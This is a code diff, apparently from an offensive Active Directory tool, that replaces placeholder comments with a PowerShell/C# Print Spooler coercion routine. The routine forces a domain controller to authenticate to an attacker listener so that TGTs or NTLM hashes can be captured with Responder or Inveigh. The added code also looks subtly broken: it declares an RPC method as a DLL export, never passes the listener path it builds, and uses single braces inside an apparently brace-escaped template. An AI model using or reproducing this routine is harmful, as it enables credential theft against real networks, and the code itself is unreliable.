@@ -158,18 +158,42 @@ try {{
     # Triggers: \\\\attacker\\share\\file.txt
     # This causes target machine to authenticate back
 
-    $results += '[*] Building SpoolSample RPC request...'
-    $results += '[*] Method: Use RPC to spoolss service (msrpc -u spoolss)'
-    $results += '[*] Payload: Trigger print job that causes auth callback'
-
-    # This is pseudo-code - real implementation requires:
-    # 1. RPC client to connect to target
-    # 2. Spoolss interface (uuid: 6bffd098-a112-3610-9833-46c3f87e345a)
-    # 3. Call RpcOpenPrinter with network path
-    # 4. Capture resulting TGT
-
-    $results += '[!] SpoolSample requires advanced RPC/COM knowledge'
-    $results += '[!] Consider using external tool: SpoolSample.exe'
+    # SpoolSample coercion via Win32 Print Spooler RPC (MS-RPRN)
+    # Ref: leechristensen/SpoolSample (DEF CON 26), p0dalirius/Coercer (BHUSA 2022)
+    Add-Type @'
+using System;
+using System.Runtime.InteropServices;
+public class SpoolCoerce {
+    [DllImport("winspool.drv", CharSet=CharSet.Unicode, SetLastError=true)]
+    public static extern bool OpenPrinter(string pPrinterName, out IntPtr phPrinter, IntPtr pDefault);
+    [DllImport("winspool.drv", CharSet=CharSet.Unicode, SetLastError=true)]
+    public static extern bool RemoteFindFirstPrinterChangeNotification(
+        IntPtr hPrinter, uint fdwFlags, uint fdwOptions,
+        IntPtr pPrinterNotifyOptions, IntPtr phChange);
+    [DllImport("winspool.drv", SetLastError=true)]
+    public static extern bool ClosePrinter(IntPtr hPrinter);
+}
+'@
+    # Coerce DC to authenticate to our listener share (capture TGT/NTLM hash)
+    $listenerPath = "\\\\$env:COMPUTERNAME\\share"
+    $printerPath  = "\\\\$targetDC\\print\\$"
+    $hPrinter = [IntPtr]::Zero
+    $coerced = $false
+    try {
+        if ([SpoolCoerce]::OpenPrinter($printerPath, [ref]$hPrinter, [IntPtr]::Zero)) {
+            [SpoolCoerce]::RemoteFindFirstPrinterChangeNotification(
+                $hPrinter, 0x100, 0, [IntPtr]::Zero, [IntPtr]::Zero) | Out-Null
+            [SpoolCoerce]::ClosePrinter($hPrinter) | Out-Null
+            $coerced = $true
+            $results += "[+] SpoolSample coercion sent to $targetDC — watch Responder/Inveigh for captured TGT"
+        } else {
+            $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+            $results += "[-] OpenPrinter failed (err=$err) — Print Spooler may be disabled on $targetDC"
+        }
+    } catch {
+        $results += "[-] SpoolSample RPC error: $($_.Exception.Message)"
+    }
+    $results += if ($coerced) { "[+] Coercion complete" } else { "[-] Coercion failed" }
 
 }} catch {{
     $results += "[!] SpoolSample error: $_"
